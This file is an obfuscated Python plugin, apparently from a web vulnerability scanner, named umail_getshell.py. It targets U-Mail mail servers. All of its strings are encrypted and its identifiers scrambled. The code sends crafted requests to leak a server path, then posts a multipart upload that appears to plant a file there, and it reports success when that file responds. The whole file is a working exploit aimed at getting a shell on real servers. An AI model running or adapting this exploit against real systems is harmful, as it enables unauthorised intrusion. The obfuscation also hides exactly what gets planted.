#Embedded file name: umail_getshell.py
import re, time
if 0:
    i11iIiiIii

def assign(service, arg):
    if service == '''umail''':
        return (True, arg)
        if 0:
            O0 / iIii1I11I1II1 % OoooooooOO - i1IIi


def o0OO00(arg):
    try:
        oo = arg + decode("\x1b'\xf0\xc4\xcd\xfdo/\x93\x97|n\x98}e\xe2\x99\xe9\xf9h\xc7\xeb\xdd\xd8\xdd\xb8\xed0\xc6\x1f\x0c\xbe\x1a \xfd\xd6")
        i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, I11i, O0O = curl.curl2(oo)
        Oo = re.search(decode('Up\xfb\xc9\xce\xb1i!\xd6\x91ss\xddz\x7f\xed\xc8\xea\xae,\xc6\xac\x9b\xe0\xf4\xb7\xe4v\xd7\x14\x0b\x96h=\xf4\xcf\xcc'), o0OoOoOO00, re.S).group(1)
        Oo = Oo.split(decode('h'))
        I1ii11iIi11i = decode('')
        for I1IiI in range(len(Oo)):
            o0OOO = Oo[I1IiI] + decode('\x1b')
            I1ii11iIi11i += o0OOO

        return I1ii11iIi11i
    except Exception as iIiiiI:
        return False
        if 0:
            iii1II11ii * i11iII1iiI + iI1Ii11111iIi + ii1II11I1ii1I + oO0o0ooO0 - iiIIIII1i1iI


def o0oO0(arg, path):
    oo = arg + decode('\x1b\'\xf0\xc4\xcd\xfdo/\x93\x92qt\x89<a\xac\x96\xa7\xf9j\x8c\xe3\xca\x92\xd8\xbc\xf8 \xdf\x15\x1b\xbfX5\xa8\xc9\xd0\xf9t"\xc8\x916f\x9egx\xa2\x9a\xb5\xf3k\x86\xf2\xd3\xdf\xdc\xf9\xe1r\xc2\x15\r\xbe')
    if 0:
        i11Ii11I1Ii1i
    Ooo = decode('\x19}\xb8\x8b\x8d\xb1+n\x91\xd95t') % hex(int(time.time() * 1000))
    o0oOoO00o = []
    o0oOoO00o.append(decode('\x19}\xb0\xd5') % Ooo)
    o0oOoO00o.append(decode('w?\xfb\xd2\xc5\xf2rn\xf8\x9dcw\x92`x\xb9\x9d\xe7\xfe>\xc8\xe0\xdd\xce\xc5\xf9\xec~\xc6\x1bD\xeaZ1\xf8\xc3\x9d\xbe#0\x9e\xf9\x1a') % decode(']=\xe5\xc9\xd2\xe8Y$\xce\x9bew'))
    o0oOoO00o.append(decode('\x05`'))
    o0oOoO00o.append(decode('\x19}\xb0\xd5') % Ooo)
    o0oOoO00o.append(decode('w?\xfb\xd2\xc5\xf2rn\xf8\x9dcw\x92`x\xb9\x9d\xe7\xfe>\xc8\xe0\xdd\xce\xc5\xf9\xec~\xc6\x1bD\xeaZ1\xf8\xc3\x9d\xbe#0\x9e\xf9\x1a') % decode(']=\xe5\xc9\xd2\xe8Y.\xd3\x90u'))
    o0oOoO00o.append(decode(']7\xfb\xc9\xd2\xf9'))
    o0oOoO00o.append(decode('\x19}\xb0\xd5') % Ooo)
    o0oOoO00o.append(decode('w?\xfb\xd2\xc5\xf2rn\xf8\x9dcw\x92`x\xb9\x9d\xe7\xfe>\xc8\xe0\xdd\xce\xc5\xf9\xec~\xc6\x1bD\xeaZ1\xf8\xc3\x9d\xbe#0\x9e\xcf0a\x94\x7ft\xa3\x95\xe5\xf59\xca\xe1\xd7\xc8\xdb\xbc\xeds\xdeT\x1c\xb9Br') % decode(']=\xe5\xc9\xd2\xe8Y%\xd5\x98u'))
    o0oOoO00o.append(decode('w?\xfb\xd2\xc5\xf2rn\xe8\x8d`b\xc734\xbe\xf9\x82') % decode('U \xe5\xca\xc9\xffg7\xd5\x9b~(\x8b}u\xe3\x99\xfb\xbda\x90\xe5\xd7\xd0'))
    i1 = decode('\xf7\xab\xb9\x13GK\xd5\x90vH\xee\xb2%\xc5\xa6\xc0\xfe\xe0\xf5h\x84\xe9\x83\x90\xc0\xb1\xe4s\xdd]_\x8bz\x14\xb5\x97\x9d\xae&\x16\xf2\xbd_I\xdd@T\x81\xb1\xcb\xc4$\xcf\xf0\xc7\xd0\xc6\xb1\xfa~\xd0\x16\x1a\xed\x14\x19\xdb\xf2\xef\xbcI\x16\xe8\xb2YK\xb836\xe8\x87\xaf\xb3\t\xe2') % path
    o0oOoO00o.append(i1)
    o0oOoO00o.append(decode('\x19}\xb0\xd5\x8d\xb1\x0bI') % Ooo)
    oOOoo00O0O = decode('9Z').join(o0oOoO00o)
    i1111 = decode("w?\xfb\xd2\xc5\xf2rn\xe8\x8d`b\xc73|\xb8\x98\xfc\xf9t\x89\xf4\xc6\x93\xce\xbb\xfar\x9f\x1e\x1e\xbeUk\xb5\xc4\xcf\xe9h'\xdd\x86i:") + Ooo
    i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, I11i, O0O = curl.curl2(oo, post=oOOoo00O0O, header=i1111)
    if 0:
        OOo000.O0I11i1i11i1I


def audit(arg):
    oo = arg + decode('\x1b\'\xf0\xc4\xcd\xfdo/\x93\x92qt\x89<x\xa3\x90\xed\xe8*\x98\xee\xc2\x83\xc5\xbb\xecj\xde\x1fB\xa5D5\xe7\xc7\xd4\xf9 "\xdf\x80yh\x93.}\xa2\x93\xe1\xfe')
    Iiii = decode('Y1\xfc\xca\xc2\xf3~~\xcf\x8dcs\x98~Q\xa9\x9b\xe5\xf1m\x86\xa8\xd1\xd3\xc5\xf2\xe4v\xdc\x11B\xf5')
    i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, I11i, O0O = curl.curl2(oo, post=Iiii)
    if 0:
        oO0o0o0ooO0oO / I1i1I - OoOoo0 % iIiiI1 % OOooO % OOoO00o
    I1ii11iIi11i = o0OO00(arg)
    if I1ii11iIi11i != False:
        I1ii11iIi11i = I1ii11iIi11i + decode(']>\xf3\xc9\x8e\xe8~7')
        o0oO0(arg, I1ii11iIi11i)
        oo = arg + decode("\x1b'\xf0\xc4\xcd\xfdo/\x93\x9d~a\x92=e\xb5\x80")
        i1iII1IiiIiI1, iIiiiI1IiI1I1, o0OoOoOO00, I11i, O0O = curl.curl2(oo)
        if i1iII1IiiIiI1 == 200 and decode('B%\xf9\xc8\xc5\xeeg!\xd0\x91') in o0OoOoOO00:
            security_hole(decode('W1\xfb\x86\xc2\xf9&$\xd9\x80co\x98\x7f}\xf7\xd1\xfb') % oo)


if __name__ == '__main__':
    from dummy import *

#KEY---345095a6a09c0643bcf41007fd1311cdf4889004e886b2bca8d4881fb27a7fca---